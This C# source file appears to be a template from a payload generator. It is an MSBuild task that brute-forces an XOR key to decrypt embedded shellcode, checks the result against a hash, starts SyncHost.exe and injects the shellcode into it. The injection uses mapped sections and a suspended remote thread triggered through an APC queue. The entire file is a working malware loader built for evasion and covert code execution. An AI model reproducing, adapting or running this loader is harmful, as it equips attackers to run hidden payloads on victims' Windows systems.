using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Diagnostics;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class ClassExample : Task, ITask
{
    public override bool Execute()
    {
        byte[] encShellcode = { {{.Payload}} };
        byte[] rawShellcode = { };
        byte[] key = { {{.Key}} };
        byte[] realHash = { {{.Hash}} };

        bool found = false;
        while (!found)
        {
            key = increase(key, 1);
            rawShellcode = xor(encShellcode, key);
            SHA256 sha256Hash = SHA256.Create();
            byte[] testHash = sha256Hash.ComputeHash(rawShellcode);
            found = compare(realHash, testHash);
        }

        PROC_VALIDATION pv = startInjectableProcess("C:\\Windows\\System32\\SyncHost.exe");
        CastleKingside(rawShellcode, pv, false);
        return true;
    }

    public static void CastleKingside(byte[] scd, PROC_VALIDATION Pv, Boolean Clean)
    {
        // Create local section & map view of that section as RW in our process
        Console.WriteLine("\n[>] Creating local section..");
        SECT_DATA LocalSect = MapLocalSection(scd.Length);
        if (!LocalSect.isvalid)
        {
            return;
        }

        // Map section into remote process
        Console.WriteLine("[>] Map RX section to remote proc..");
        SECT_DATA RemoteSect = MapRemoteSection(Pv.hProc, LocalSect.hSection, scd.Length);
        if (!RemoteSect.isvalid)
        {
            return;
        }

        // Write sc to local section
        Console.WriteLine("[>] Write shellcode to local section..");
        Console.WriteLine("    |-> Size: " + scd.Length);
        Marshal.Copy(scd, 0, LocalSect.pBase, scd.Length);


        // Find remote thread start address offset from base -> RtlExitUserThread
        Console.WriteLine("[>] Seek export offset..");
        Console.WriteLine("    |-> pRemoteNtDllBase: 0x" + String.Format("{0:X}", (Pv.pNtllBase).ToInt64()));
        IntPtr pFucOffset = GetLocalExportOffset("ntdll.dll", "RtlExitUserThread");
        if (pFucOffset == IntPtr.Zero)
        {
            return;
        }

        // Create suspended thread at RtlExitUserThread in remote proc
        Console.WriteLine("[>] NtCreateThreadEx -> RtlExitUserThread <- Suspended..");
        IntPtr hRemoteThread = IntPtr.Zero;
        IntPtr pRemoteStartAddress = (IntPtr)((Int64)Pv.pNtllBase + (Int64)pFucOffset);
        UInt32 CallResult = NtCreateThreadEx(ref hRemoteThread, 0x1FFFFF, IntPtr.Zero, Pv.hProc, pRemoteStartAddress, IntPtr.Zero, true, 0, 0xffff, 0xffff, IntPtr.Zero);
        if (hRemoteThread == IntPtr.Zero)
        {
            Console.WriteLine("[!] Failed to create remote thread..");
            return;
        }
        else
        {
            Console.WriteLine("    |-> Success");
        }

        // Queue APC
        Console.WriteLine("[>] Set APC trigger & resume thread..");
        CallResult = NtQueueApcThread(hRemoteThread, RemoteSect.pBase, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        if (CallResult == 0)
        {
            Console.WriteLine("    |-> NtQueueApcThread");
        }
        else
        {
            Console.WriteLine("[!] Unable register APC..");
            return;
        }

        // Resume thread
        UInt32 SuspendCount = 0;
        CallResult = NtAlertResumeThread(hRemoteThread, ref SuspendCount);
        if (CallResult == 0)
        {
            Console.WriteLine("    |-> NtAlertResumeThread");
        }
        else
        {
            Console.WriteLine("[!] Failed to resume thread..");
        }

        // Wait & clean up?
        if (Clean)
        {
            Console.WriteLine("[>] Waiting for payload to finish..");
            while (true)
            {
                THREAD_BASIC_INFORMATION ts = GetThreadState(hRemoteThread);
                if (ts.ExitStatus != 259) // STILL_ACTIVE
                {
                    Console.WriteLine("    |-> Thread exit status -> " + ts.ExitStatus);
                    UInt32 Unmap = NtUnmapViewOfSection(Pv.hProc, RemoteSect.pBase);
                    if (Unmap == 0)
                    {
                        Console.WriteLine("    |-> NtUnmapViewOfSection");
                    }
                    else
                    {
                        Console.WriteLine("[!] Failed to unmap remote section..");
                    }
                    break;
                }
                System.Threading.Thread.Sleep(400); // Sleep precious, sleep
            }
        }
    }

    static byte[] increase(byte[] Counter, int Count)
    {
        int carry = 0;
        byte[] buffer = new byte[Counter.Length];
        int offset = buffer.Length - 1;
        byte[] cnt = BitConverter.GetBytes(Count);
        byte osrc, odst, ndst;

        Buffer.BlockCopy(Counter, 0, buffer, 0, Counter.Length);

        for (int i = offset; i > 0; i--)
        {
            odst = buffer[i];
            osrc = offset - i < cnt.Length ? cnt[offset - i] : (byte)0;
            ndst = (byte)(odst + osrc + carry);
            carry = ndst < odst ? 1 : 0;
            buffer[i] = ndst;
        }

        return buffer;
    }

    static byte[] xor(byte[] data, byte[] key)
    {
        byte[] result = new byte[data.Length];
        for (int i = 0; i < data.Length; ++i)
        {
            result[i] = (byte)(data[i] ^ key[i % key.Length]);
        }
        return result;
    }

    static bool compare(byte[] a1, byte[] a2)
    {
        if (a1.Length != a2.Length)
        {
            return false;
        }

        for (int i = 0; i < a1.Length; i++)
        {
            if (a1[i] != a2[i])
            {
                return false;
            }
        }

        return true;
    }

    static PROC_VALIDATION findInjectableProcess(string[] targets)
    {
        Console.WriteLine("\n[>] Selecting injectable process...");
        var currentSessionID = Process.GetCurrentProcess().SessionId;
        var allProcesses = new List<Process>();

        foreach (string t in targets)
        {
            allProcesses.AddRange(Process.GetProcessesByName(t));
        }

        foreach (Process p in allProcesses)
        {
            if (p.Id > 1 && p.SessionId == currentSessionID)
            {
                PROC_VALIDATION pv = ValidateProc(p.Id);
                if (pv.isvalid)
                {
                    Console.WriteLine("    |-> PID: " + p.Id);
                    Console.WriteLine("    |-> Process Name: " + pv.sName);
                    return pv;
                }
            }
        }
        Console.WriteLine("[!] Failed to find injectable process..");
        return new PROC_VALIDATION();
    }

    static PROC_VALIDATION startInjectableProcess(string executablePath)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = executablePath;
        proc.Start();
        proc.WaitForInputIdle();
        return ValidateProc(proc.Id);
    }


    // Structs
    //-----------------------------------
    [StructLayout(LayoutKind.Sequential)]
    public struct PROC_VALIDATION
    {
        public Boolean isvalid;
        public String sName;
        public IntPtr hProc;
        public IntPtr pNtllBase;
        public Boolean isWow64;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SC_DATA
    {
        public UInt32 iSize;
        public byte[] bScData;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECT_DATA
    {
        public Boolean isvalid;
        public IntPtr hSection;
        public IntPtr pBase;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING
    {
        public UInt16 Length;
        public UInt16 MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct ANSI_STRING
    {
        public UInt16 Length;
        public UInt16 MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    [StructLayout(LayoutKind.Sequential)]
    public class THREAD_BASIC_INFORMATION
    {
        public UInt32 ExitStatus;
        public IntPtr TebBaseAddress;
        public CLIENT_ID ClientId;
        public UIntPtr AffinityMask;
        public int Priority;
        public int BasePriority;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 0)]
    public struct OBJECT_ATTRIBUTES
    {
        public Int32 Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    // APIs
    //-----------------------------------
    [DllImport("ntdll.dll")]
    public static extern UInt32 NtOpenProcess(
        ref IntPtr ProcessHandle,
        UInt32 DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes,
        ref CLIENT_ID ClientId);

    [DllImport("ntdll.dll")]
    public static extern UInt32 NtQueryInformationProcess(
        IntPtr processHandle,
        UInt32 processInformationClass,
        ref ulong processInformation,
        int processInformationLength,
        ref UInt32 returnLength);

    [DllImport("ntdll.dll")]
    public static extern UInt32 NtCreateSection(
        ref IntPtr section,
        UInt32 desiredAccess,
        IntPtr pAttrs,
        ref long MaxSize,
        uint pageProt,
        uint allocationAttribs,
        IntPtr hFile);

    [DllImport("ntdll.dll")]
    public static extern UInt32 NtMapViewOfSection(
        IntPtr SectionHandle,
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        IntPtr CommitSize,
        ref long SectionOffset,
        ref long ViewSize,
        uint InheritDisposition,
        uint AllocationType,
        uint Win32Protect);

    [DllImport("ntdll.dll")]
    public static extern UInt32 NtUnmapViewOfSection(
        IntPtr ProcessHandle,
        IntPtr BaseAddress);

    // Not used but for ref in case of
    // NtOpenThread -> NtQueueApcThread
    [DllImport("ntdll.dll")]
    public static extern UInt32 NtOpenThread(
            IntPtr ThreadHandle,
            UInt32 DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            IntPtr ClientId);

    [DllImport("ntdll.dll")]
    public static extern UInt32 NtQueueApcThread(
            IntPtr ThreadHandle,
            IntPtr ApcRoutine,
            IntPtr ApcArgument1,
            IntPtr ApcArgument2,
            IntPtr ApcArgument3);

    [DllImport("ntdll.dll")]
    public static extern UInt32 NtCreateThreadEx(
        ref IntPtr hThread,
        UInt32 DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ProcessHandle,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        bool CreateSuspended,
        UInt32 StackZeroBits,
        UInt32 SizeOfStackCommit,
        UInt32 SizeOfStackReserve,
        IntPtr lpBytesBuffer);

    [DllImport("ntdll.dll")]
    public static extern void RtlInitUnicodeString(
        ref UNICODE_STRING DestinationString,
        [MarshalAs(UnmanagedType.LPWStr)]
        string SourceString);

    [DllImport("ntdll.dll")]
    public static extern UInt32 RtlUnicodeStringToAnsiString(
        ref ANSI_STRING DestinationString,
        ref UNICODE_STRING SourceString,
        bool AllocateDestinationString);

    [DllImport("ntdll.dll")]
    public static extern UInt32 LdrGetDllHandle(
        IntPtr DllPath,
        IntPtr DllCharacteristics,
        ref UNICODE_STRING DllName,
        ref IntPtr DllHandle);

    [DllImport("ntdll.dll")]
    public static extern UInt32 LdrGetProcedureAddress(
        IntPtr hModule,
        ref ANSI_STRING ModName,
        UInt32 Ordinal,
        ref IntPtr FunctionAddress);

    [DllImport("ntdll.dll")]
    public static extern UInt32 NtAlertResumeThread(
        IntPtr ThreadHandle,
        ref UInt32 PreviousSuspendCount);

    [DllImport("ntdll.dll")]
    public static extern UInt32 NtQueryInformationThread(
        IntPtr ThreadHandle,
        int ThreadInformationClass,
        IntPtr ThreadInformation,
        int ThreadInformationLength,
        ref int ReturnLength);


    public static IntPtr GetProcessHandle(Int32 ProcId)
    {
        IntPtr hProc = IntPtr.Zero;
        OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
        CLIENT_ID ci = new CLIENT_ID();
        ci.UniqueProcess = (IntPtr)ProcId;
        UInt32 CallResult = NtOpenProcess(ref hProc, 0x1F0FFF, ref oa, ref ci);
        return hProc;
    }

    public static PROC_VALIDATION ValidateProc(Int32 ProcId)
    {
        PROC_VALIDATION Pv = new PROC_VALIDATION();

        try
        {
            Process Proc = Process.GetProcessById(ProcId);
            ProcessModuleCollection ProcModColl = Proc.Modules;
            foreach (ProcessModule Module in ProcModColl)
            {
                if (Module.FileName.EndsWith("ntdll.dll"))
                {
                    Pv.pNtllBase = Module.BaseAddress;
                }
            }
            Pv.isvalid = true;
            Pv.sName = Proc.ProcessName;
            Pv.hProc = GetProcessHandle(ProcId);
            ulong isWow64 = 0;
            uint RetLen = 0;
            NtQueryInformationProcess(Pv.hProc, 26, ref isWow64, Marshal.SizeOf(isWow64), ref RetLen);
            if (isWow64 == 0)
            {
                Pv.isWow64 = false;
            }
            else
            {
                Pv.isWow64 = true;
            }
        }
        catch
        {
            Pv.isvalid = false;
        }

        return Pv;
    }

    public static SECT_DATA MapLocalSection(long ScSize)
    {
        SECT_DATA SectData = new SECT_DATA();

        long MaxSize = ScSize;
        IntPtr hSection = IntPtr.Zero;
        UInt32 CallResult = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x40, 0x8000000, IntPtr.Zero);
        if (CallResult == 0 && hSection != IntPtr.Zero)
        {
            Console.WriteLine("    |-> hSection: 0x" + String.Format("{0:X}", (hSection).ToInt64()));
            Console.WriteLine("    |-> Size: " + ScSize);
            SectData.hSection = hSection;
        }
        else
        {
            Console.WriteLine("[!] Failed to create section..");
            SectData.isvalid = false;
            return SectData;
        }

        IntPtr pScBase = IntPtr.Zero;
        long lSecOffset = 0;
        CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x4);
        if (CallResult == 0 && pScBase != IntPtr.Zero)
        {
            Console.WriteLine("    |-> pBase: 0x" + String.Format("{0:X}", (pScBase).ToInt64()));
            SectData.pBase = pScBase;
        }
        else
        {
            Console.WriteLine("[!] Failed to map section locally..");
            SectData.isvalid = false;
            return SectData;
        }

        SectData.isvalid = true;
        return SectData;
    }

    public static SECT_DATA MapRemoteSection(IntPtr hProc, IntPtr hSection, long ScSize)
    {
        SECT_DATA SectData = new SECT_DATA();

        IntPtr pScBase = IntPtr.Zero;
        long lSecOffset = 0;
        long MaxSize = ScSize;
        UInt32 CallResult = NtMapViewOfSection(hSection, hProc, ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x20);
        if (CallResult == 0 && pScBase != IntPtr.Zero)
        {
            Console.WriteLine("    |-> pRemoteBase: 0x" + String.Format("{0:X}", (pScBase).ToInt64()));
            SectData.pBase = pScBase;
        }
        else
        {
            Console.WriteLine("[!] Failed to map section in remote process..");
            SectData.isvalid = false;
            return SectData;
        }

        SectData.isvalid = true;
        return SectData;
    }

    public static IntPtr GetLocalExportOffset(String Module, String Export)
    {
        UNICODE_STRING uModuleName = new UNICODE_STRING();
        RtlInitUnicodeString(ref uModuleName, Module);
        IntPtr hModule = IntPtr.Zero;
        UInt32 CallResult = LdrGetDllHandle(IntPtr.Zero, IntPtr.Zero, ref uModuleName, ref hModule);
        if (CallResult != 0 || hModule == IntPtr.Zero)
        {
            Console.WriteLine("[!] Failed to get " + Module + " handle..");
            return IntPtr.Zero;
        }
        else
        {
            Console.WriteLine("    |-> LdrGetDllHandle OK");
        }

        // Hey MSFT, why is RtlInitAnsiString not working on Win7..?
        UNICODE_STRING uFuncName = new UNICODE_STRING();
        RtlInitUnicodeString(ref uFuncName, Export);
        ANSI_STRING aFuncName = new ANSI_STRING();
        RtlUnicodeStringToAnsiString(ref aFuncName, ref uFuncName, true);
        IntPtr pExport = IntPtr.Zero;
        CallResult = LdrGetProcedureAddress(hModule, ref aFuncName, 0, ref pExport);

        if (CallResult != 0 || pExport == IntPtr.Zero)
        {
            Console.WriteLine("[!] Failed to get " + Export + " address..");
            return IntPtr.Zero;
        }
        else
        {
            Console.WriteLine("    |-> " + Export + ": 0x" + String.Format("{0:X}", (pExport).ToInt64()));
        }

        IntPtr FuncOffset = (IntPtr)((Int64)(pExport) - (Int64)(hModule));
        Console.WriteLine("    |-> Offset: 0x" + String.Format("{0:X}", (FuncOffset).ToInt64()));

        return FuncOffset;
    }

    public static THREAD_BASIC_INFORMATION GetThreadState(IntPtr hThread)
    {
        THREAD_BASIC_INFORMATION ts = new THREAD_BASIC_INFORMATION();
        IntPtr BuffPtr = Marshal.AllocHGlobal(Marshal.SizeOf(ts));
        int RetLen = 0;
        UInt32 CallResult = NtQueryInformationThread(hThread, 0, BuffPtr, Marshal.SizeOf(ts), ref RetLen);
        if (CallResult != 0)
        {
            Console.WriteLine("[!] Failed to query thread information..");
            return ts;
        }

        // Ptr to struct
        ts = (THREAD_BASIC_INFORMATION)Marshal.PtrToStructure(BuffPtr, typeof(THREAD_BASIC_INFORMATION));

        return ts;
    }
}